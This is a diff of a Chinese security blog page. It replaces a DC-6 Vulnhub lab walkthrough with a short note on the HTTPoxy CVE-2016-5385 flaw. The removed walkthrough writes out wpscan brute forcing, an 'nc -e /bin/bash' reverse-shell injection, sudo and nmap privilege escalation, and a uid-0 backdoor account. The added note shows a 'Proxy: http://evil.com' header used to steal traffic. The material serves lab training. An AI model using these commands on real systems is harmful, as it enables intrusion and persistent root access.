@@ -17,7 +17,7 @@
     <meta name="keywords" content="G00dddd">
 
 
-<title>DC-6 | G00d`s Blog</title>
+<title>Vulhub-13.CGI | G00d`s Blog</title>
 
 
 
@@ -390,7 +390,7 @@
     
     <article class="post-wrap">
         <header class="post-header">
-            <h1 class="post-title">DC-6</h1>
+            <h1 class="post-title">Vulhub-13.CGI</h1>
             
                 <div class="post-meta">
                     
@@ -399,14 +399,14 @@
 
                     
                         <span class="post-time">
-                        Date: <a href="#">十一月 22, 2024&nbsp;&nbsp;17:06:26</a>
+                        Date: <a href="#">十一月 22, 2024&nbsp;&nbsp;17:22:27</a>
                         </span>
                     
                     
                         <span class="post-category">
                     Category:
                             
-                                <a href="../categories/Vulnhub/">Vulnhub</a>
+                                <a href="../categories/Vulhub/">Vulhub</a>
                             
                         </span>
                     
@@ -415,49 +415,25 @@
         </header>
 
         <div class="post-content">
-            <h1 id="DC-6"><a href="#DC-6" class="headerlink" title="DC-6"></a>DC-6</h1><p>第一步信息收集</p>
-<p><img src="/dc-6//1.png" alt="1"></p>
-<p>192.168.213.158</p>
-<p><img src="/dc-6//2.png" alt="2"></p>
-<p>Vi &#x2F;etc&#x2F;hosts 把重定向加上就行了</p>
-<p>接着扫目录发现跟之前打过的靶机有点像</p>
-<p><img src="/dc-6//3.png" alt="3"></p>
-<p><img src="/dc-6//4.png" alt="4"></p>
-<p>用wpscan(专门搜索wordpross漏洞)再看看</p>
-<p>Wpscan –url <a target="_blank" rel="noopener" href="http://wordy/">http://wordy</a></p>
-<p><img src="/dc-6//5.png" alt="5"></p>
-<p>用wpscan枚举一下用户名</p>
-<p>Wpscan –url <a target="_blank" rel="noopener" href="http://wordy/">http://wordy</a> –enumerate u</p>
-<p><img src="/dc-6//6.png" alt="6"></p>
-<p>爆出几个账号,cat &gt; 1.txt 保存一下,然后wpscan –url <a target="_blank" rel="noopener" href="http://wordy/">http://wordy</a> -U 1.txt -P rockyou.txt</p>
-<p><img src="/dc-6//7.png" alt="7"></p>
-<p>Url&#x2F;wp-login.php 登录后台发现activity monitor</p>
-<p>用searchsploit activity monitor</p>
-<p><img src="/dc-6//8.png" alt="8"></p>
-<p><img src="/dc-6//../../../../%E5%88%B7%E9%A2%98/%E6%9C%AC%E5%9C%B0/vulnhub/media/image9.png"><img src="/dc-6//9.png" alt="9">这里有命令执行,127.0.0.1|nc -e &#x2F;bin&#x2F;bash 192.168.213.137 9999</p>
-<p><img src="/dc-6//10.png" alt="10"></p>
-<p>拿到普通权限</p>
-<p>Python -c ‘import pty;pty.spawn(“&#x2F;bin&#x2F;bash”)’</p>
-<p>在主机内部找信息</p>
-<p><img src="/dc-6//11.png" alt="11"></p>
-<p>Ssh <a href="mailto:&#103;&#x72;&#97;&#104;&#x61;&#109;&#x40;&#x31;&#x39;&#50;&#x2e;&#49;&#x36;&#x38;&#46;&#50;&#x31;&#x33;&#x2e;&#x31;&#x35;&#56;">&#103;&#x72;&#97;&#104;&#x61;&#109;&#x40;&#x31;&#x39;&#50;&#x2e;&#49;&#x36;&#x38;&#46;&#50;&#x31;&#x33;&#x2e;&#x31;&#x35;&#56;</a></p>
-<p>提权</p>
-<p><img src="/dc-6//12.png" alt="12"></p>
-<p>我们发现当前账号对backups.sh读写操作</p>
-<p>把shell写入backups</p>
-<p>Echo “&#x2F;bin&#x2F;bash” &gt;&gt; backups.sh</p>
-<p>Sudo -u jens .&#x2F;backups.sh &#x2F;&#x2F;这里用jens执行backups</p>
-<p><img src="/dc-6//13.png" alt="13"></p>
-<p>发现切换账号成功</p>
-<p>Sudo -l发现jens可以用root执行nmap,那就用nmap提权</p>
-<p><img src="/dc-6//14.png" alt="14"></p>
-<p>需要先看nmap的版本号 nmap -v</p>
-<p>然后把shell写入”shell”里,用nmap执行</p>
-<p>echo ‘os.execute(“&#x2F;bin&#x2F;sh”)’ &gt; shell</p>
-<p>sudo nmap –script&#x3D;shell</p>
-<p><img src="/dc-6//15.png" alt="15"></p>
-<p>添加root账号</p>
-<p>useradd -u 0 -o -g 0 -G root -s &#x2F;bin&#x2F;bash -d &#x2F;home&#x2F;root1-m root1</p>
+            <h1 id="CGI"><a href="#CGI" class="headerlink" title="CGI"></a>CGI</h1><h2 id="HTTPoxy漏洞（CVE-2016-5385）"><a href="#HTTPoxy漏洞（CVE-2016-5385）" class="headerlink" title="HTTPoxy漏洞（CVE-2016-5385）"></a>HTTPoxy漏洞（CVE-2016-5385）</h2><p>根据RFC 3875规定，CGI（fastcgi）要将用户传入的所有HTTP头都加上`HTTP_`前缀放入环境变量中，而恰好大多数类库约定俗成会提取环境变量中的`HTTP_PROXY`值作为HTTP代理地址。于是，恶意用户通过提交`Proxy: <a target="_blank" rel="noopener" href="http://evil.com/%60%E8%BF%99%E6%A0%B7%E7%9A%84HTTP%E5%A4%B4%EF%BC%8C%E5%B0%86%E4%BD%BF%E7%94%A8%E7%BC%BA%E9%99%B7%E7%B1%BB%E5%BA%93%E7%9A%84%E7%BD%91%E7%AB%99%E7%9A%84%E4%BB%A3%E7%90%86%E8%AE%BE%E7%BD%AE%E4%B8%BA/%60http://evil.com/%60%EF%BC%8C%E8%BF%9B%E8%80%8C%E7%AA%83%E5%8F%96%E6%95%B0%E6%8D%AE%E5%8C%85%E4%B8%AD%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8%E7%9A%84%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E3%80%82">http://evil.com\`这样的HTTP头，将使用缺陷类库的网站的代理设置为\`http://evil.com\`，进而窃取数据包中可能存在的敏感信息。</a></p>
+<p>PHP5.6.24版本修复了该漏洞，不会再将`Proxy`放入环境变量中。本环境使用PHP 5.6.23为例。</p>
+<p>当然，该漏洞不止影响PHP，所有以CGI或Fastcgi运行的程序理论上都受到影响。CVE-2016-5385是PHP的CVE，HTTPoxy所有的CVE编号如下：</p>
+<p>- CVE-2016-5385: PHP</p>
+<p>- CVE-2016-5386: Go</p>
+<p>- CVE-2016-5387: Apache HTTP Server</p>
+<p>- CVE-2016-5388: Apache Tomcat</p>
+<p>- CVE-2016-6286: spiffy-cgi-handlers for CHICKEN</p>
+<p>- CVE-2016-6287: CHICKEN’s http-client</p>
+<p>- CVE-2016-1000104: mod_fcgi</p>
+<p>- CVE-2016-1000105: Nginx cgi script</p>
+<p>- CVE-2016-1000107: Erlang inets</p>
+<p>- CVE-2016-1000108: YAWS</p>
+<p>- CVE-2016-1000109: HHVM FastCGI</p>
+<p>- CVE-2016-1000110: Python CGIHandler</p>
+<p>- CVE-2016-1000111: Python Twisted</p>
+<p>- CVE-2016-1000212: lighttpd</p>
+<p>这个漏洞就是抓包加上Proxy:,能抓到数据包</p>
+<p><img src="/vulhub-13-cgi//1.png" alt="1"></p>
 
         </div>
 
@@ -494,10 +470,10 @@
         </section>
         <section class="post-nav">
             
-                <a class="prev" rel="prev" href="../dc-7/">DC-7</a>
+                <a class="prev" rel="prev" href="../%E5%8F%91%E5%B1%95%E5%AF%B9%E8%B1%A1%E5%9F%B9%E8%AE%AD/">发展对象培训</a>
             
             
-            <a class="next" rel="next" href="../dc-5/">DC-5</a>
+            <a class="next" rel="next" href="../vulhub-12-celery/">Vulhub-12.Celery</a>
             
         </section>
 
